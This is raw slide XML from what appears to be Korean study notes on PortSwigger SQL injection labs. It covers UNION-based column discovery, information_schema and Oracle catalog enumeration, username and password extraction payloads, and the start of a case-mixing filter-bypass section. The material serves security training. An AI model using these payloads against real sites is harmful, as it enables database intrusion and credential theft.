              <a:latin typeface="Courie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76C317-ECF7-4DE7-A6E8-B7CF7CD7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9642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9E86E-9E90-419E-8730-25582CBF1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677B9-2634-4615-8146-14BD57DD3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(union-attacks/lab-determine-number-of-columns)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https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns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A86BFA-1710-4528-A31C-DC9C97B0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614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B53AB-3A22-4CD7-9070-C33ED9C1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Determining the number of columns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B57B2B-4AC8-4164-9B73-DDBDE16B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‘+UNION+SELECT+NULL,NULL,NULL—</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>‘ ORDER BY 4 =&gt; Internal Server Error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6C10F6-9283-41F0-9BBB-5862DA9D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9213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C7A73-E70D-410F-A164-6879971E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C1AAD-BC72-4BDA-A486-88E132D6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UNION attack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 을 하는 이유는 주입된 쿼리에서 결과를 검색할 수 있기 때문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일반적으로 검색할 데이터는 문자열 형식이다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문자열 데이터와 호환되거나 일치하는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>COLUMN </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>하나 이상 찾아야함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96E5-3C4D-4E58-B9DE-692BBB82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3507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C7A73-E70D-410F-A164-6879971E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C1AAD-BC72-4BDA-A486-88E132D6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COLUMN </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>의 개수는 알아낸 상태이므로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COLUMN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에 차례로 문자열을 배치하는 방식으로 테스트할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96E5-3C4D-4E58-B9DE-692BBB82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DEA0FA3-EA10-4A78-92C8-5173FD3D7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981" y="2948849"/>
            <a:ext cx="8446037" cy="23394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4636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C7A73-E70D-410F-A164-6879971E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C1AAD-BC72-4BDA-A486-88E132D6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만약 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>COLUMN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>의 데이터 유형이 호환되지 않는 경우</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>다음과 같은 오류를 발생시킴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오류가 발생하지 않고</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, response</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에 문자열 값을 포함한 내용이 추가된 경우</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 해당 칼럼이 데이터를 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>UNION attack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>을 하기 적합한 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>COLUMN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>임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96E5-3C4D-4E58-B9DE-692BBB82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D6A67D-C704-4368-9576-965CDDB7C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2506003"/>
            <a:ext cx="9535856" cy="3524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28982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C7A73-E70D-410F-A164-6879971E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C1AAD-BC72-4BDA-A486-88E132D6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(union-attacks/lab-find-column-containing-text)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https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text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96E5-3C4D-4E58-B9DE-692BBB82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9325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C7A73-E70D-410F-A164-6879971E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C1AAD-BC72-4BDA-A486-88E132D6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 UNION SELECT ‘test’, NULL, NULL-- -</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>‘ UNION SELECT NULL, ‘test’, NULL-- -</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>‘ UNION SELECT NULL, NULL, ‘test’-- -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896E5-3C4D-4E58-B9DE-692BBB829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4670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E4B43-376D-493F-ACA8-C4EBB19E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Finding columns with a useful data type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9B152-11E5-4C12-997E-0C5CCE022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찾아낸 칼럼에 정보가 담기도록 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 구성하면 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' UNION SELECT NULL, password, NULL FROM users—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C76AD5-996F-4BB3-989B-825F79463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00922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D217B-5965-4292-8CC8-188D94DD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multiple values within a single column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0B6710-71E0-4339-AC96-E5F300BF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조회하고 싶은 데이터가 여러 개 이지만</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, UNION attack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>을 수행할 수 있는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>COLUMN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>이 하나라면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여러 가지 데이터를 하나의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>COLUMN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>으로 가져올 수 있음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Oracle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에서 다음 입력을 제출할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Mysql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>이나 기타 등등은 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>CONCAT() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>같은 함수와 같은 다른 방법이 있음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D40AF1-29C0-4A7C-9DEF-A8A60120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B222E9-B70E-4BA1-B395-8800C6AC0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79" y="4143346"/>
            <a:ext cx="9486675" cy="5222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60720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755A2-CE4F-4E73-B9B0-A90ED87A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multiple values within a single column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6D7588-9DDA-46EA-8D21-2C006E4C5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Oracle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>의 문자열 연결 연산자은 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>|| </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>이다</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>. (OR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>과 다름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3669F4-2FFD-481D-ACE0-48F53C67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6DADB9D-28E9-4B90-A4EA-A313C7C24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83" y="2966796"/>
            <a:ext cx="2991267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9398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9398B9-3544-4F2B-88AA-4E72F2B86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multiple values within a single column</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" dirty="0"/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923B4B16-D2D4-4084-BB01-545A2A831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560" y="2357290"/>
            <a:ext cx="8252879" cy="2763351"/>
          </a:xfrm>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="tx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EC9B4-42AF-4AA6-BF17-62468B4A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12826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0F28E-4CC3-4321-B390-546DCE58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Retrieving multiple values within a single column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52196-B764-4A5F-BCC9-8FE157E54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 (union-attacks/lab-retrieve-multiple-values-in-single-column)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>하나의 컬럼에 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>username, password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 알아내기</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>table</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>명은 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>users, COLUMN </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>명은 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>username, password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administrator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>로 로그인 하세요</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>!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버전을 알아내고 알맞은 문자열 합치기를 하면 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https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column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A2A15-9970-4FCF-A14E-5677A0EC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pic>
        <p:nvPicPr>
          <p:cNvPr id="5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2CD77DDA-97BF-4466-836B-8B5FD60A1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430" y="4717372"/>
            <a:ext cx="4126439" cy="1381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2D4D6C6D-FB15-49EA-8E8C-76E185CC2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965" y="4627541"/>
            <a:ext cx="4126440" cy="15931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89430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Examining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복습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pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="그림 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6BE65C3C-86AF-4024-8B8D-2B5DF9292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686" y="2350164"/>
            <a:ext cx="6962627" cy="2403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4E5E27-DF73-4B02-A472-3BC8EECFE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024" y="5136452"/>
            <a:ext cx="5359951" cy="5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198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 Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 취약점을 찾았을 때</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>일반적으로 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>table</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>명과 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>column</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>명을 알 수 없음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대부분의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Database </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>종류는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Database </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>정보를 제공하는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>nformation schema </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>라는 보기 집합이 있음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18359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 err="1"/>
              <a:t>information_schema.tables</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 쿼리하여 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>database</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>table</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>을 나열할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output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B69212-103E-41C4-B872-1B115B94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92" y="2392680"/>
            <a:ext cx="7839415" cy="588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9BC834D6-6EEF-49E5-9A49-23ACD3BB2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678" y="3819403"/>
            <a:ext cx="7106642" cy="1733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98603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Products, Users, Feedback 3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>개의 테이블이 있는 것을 알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pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="그림 5" descr="텍스트, 테이블이(가) 표시된 사진&#10;&#10;자동 생성된 설명">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E40307CD-76AC-485F-8479-29AAC384D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96" y="2359931"/>
            <a:ext cx="7106642" cy="17337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03744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table </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>명을 알아냈으니</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, column</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 명도 알아낼 수 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b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="333332"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>information_schema.columns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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333332"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>를 이용</a:t>
            </a:r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!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="ko-KR" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="333332"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Courier"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333332"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>output</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0">
              <a:solidFill>
                <a:srgbClr val="333332"/>
              </a:solidFill>
              <a:latin typeface="Courier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3AF181-6850-4408-98E6-824CE18F9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466" y="3119282"/>
            <a:ext cx="8707065" cy="371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76305AD0-43F0-4B61-AB41-782B53DF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464" y="4168571"/>
            <a:ext cx="7925906" cy="1705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51587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(examining-the-database/lab-listing-database-contents-non-oracle)</a:t>
            </a:r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table_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>information_schema.tables</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>;</a:t>
            </a:r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column_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>information_schema.columns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=‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>asdf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>’;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle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24EA4B07-08B5-4DB5-9F1A-40BFF4D6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3472462"/>
            <a:ext cx="5557492" cy="280914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38725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053100-394F-4271-A777-135AD1C4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Listing the contents of the database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905C02-DBF0-44FB-BC8A-4839CAABD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'order by 3-- -</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>'union select '1', '2'-- -</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>'union select NULL, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>table_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>information_schema.tables</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>-- -</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>'union select NULL, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>column_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>information_schema.columns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='</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>users_npnaaw</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>'-- -</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>'union select </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>username_riajbj</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>password_lnwcja</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>users_npnaaw</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>-- -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2AC5A0-7854-46C4-B686-470C7296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6981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Equivalent to information schema on Oracle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Oracle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>의 경우</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>다른 쿼리를 이용하여 같은 정보를 가져올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Table</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>들을 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>list</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>SELECT * FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>all_tables</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="201168" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Column</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>들을 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>list</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/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 err="1"/>
              <a:t>all_tab_columns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 = ‘users’;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1709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2C738-96DE-4E58-8A61-43CE1745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Equivalent to information schema on Oracle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09470-D04B-44AB-A9A1-6704CCAFA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Oracle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>의 경우</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>다른 쿼리를 이용하여 같은 정보를 가져올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Table</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>들을 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>list</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>SELECT * FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>all_tables</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="201168" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Column</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>들을 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>list</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/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 err="1"/>
              <a:t>all_tab_columns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 = ‘users’;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416CA-2EDA-4C06-B393-2BF2BE7B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98442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3D176-9FFA-4924-B1DB-BB295228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Equivalent to information schema on Oracle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C9799-4A4E-472D-A3B8-0DA298641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(examining-the-database/lab-listing-database-contents-oracle)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>SELECT ‘1’, ‘2’ FROM dual; =&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>칼럼 위치 알아낼 때 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>oracle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>은 무조건 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>from</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>이 있어야한다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table_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>all_tables</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>--</a:t>
            </a:r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column_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>all_tab_columns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=‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>asdf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>’--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https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle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226D4-DCD7-4370-A4E0-6C66ACF84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35335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CF880-5E64-4BC4-AAE1-353C6BAE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Equivalent to information schema on Oracle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98F64-4A61-43FF-A861-9977F9771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'union select NULL, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>table_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>all_tables</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>--</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>'union select NULL, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>column_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>all_tab_columns</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>table_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>='USERS_MCRBIK'--</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>'union select USERNAME_MMFASQ, PASSWORD_RMJJYV from USERS_MCRBIK--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1F8B2E-5361-49F9-B37F-F167E024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209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A302A-610A-4247-AA81-0A5D2AEE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Equivalent to information schema on Oracle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ED8F0E-893C-465E-81C2-94AA136EB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A83D1-79A4-4774-819C-6C48C539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B7AD6A7-590F-4005-A19A-0F408CAB1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1822762"/>
            <a:ext cx="10174120" cy="4134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93523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68758-8372-4B26-AD76-B171F221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 Bypass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095C-53EF-4814-99AB-21EC6862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방화벽 필터링 우회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단순 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>string </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>우회</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>UnIoN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>SeLecT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> 1,2,3 -- -</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
